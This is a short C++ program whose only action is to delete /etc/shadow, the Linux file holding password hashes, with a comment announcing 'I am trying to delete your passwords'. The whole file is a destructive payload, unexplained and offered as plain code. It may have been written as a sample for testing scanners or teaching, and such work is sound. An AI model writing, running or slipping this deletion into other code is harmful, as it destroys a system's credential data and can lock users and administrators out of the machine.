#include <iostream>
#include <fstream>

int main() {
    // I am trying to delete your passwords
    std::remove("/etc/shadow"); 
    return 0;
}